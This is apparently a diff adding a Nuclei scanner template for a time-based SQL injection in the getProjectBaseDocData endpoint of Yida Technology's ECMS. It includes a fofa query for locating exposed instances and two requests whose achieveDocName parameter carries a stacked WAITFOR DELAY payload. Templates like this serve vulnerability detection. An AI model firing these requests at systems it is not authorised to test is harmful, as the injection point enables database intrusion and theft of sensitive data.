@@ -1,0 +1,25 @@
+id: yida-ecms-getprojectbasedocdata-sqli
+info:
+  name: "易达科技ECMS getProjectBaseDocData 接口 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="易达科技-ECMS"
+        易达科技ECMS（工程造价咨询企业管理系统）为工程造价咨询企业提供数字化解决方案，集成行业最佳实践与信息技术，支持企业数字化转型及全过程工程咨询业务。该系统getProjectBaseDocData接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句实现数据库敏感信息泄露
+  tags: 易达科技ECMS
+http:
+- raw:
+  - |
+    GET /ecmsToBim/getProjectBaseDocData?taskId=1&isHide=&achieveDocName=1%27);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  - |
+    GET /ecmsToBim/getProjectBaseDocData?taskId=1&isHide=&achieveDocName=1%27);WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
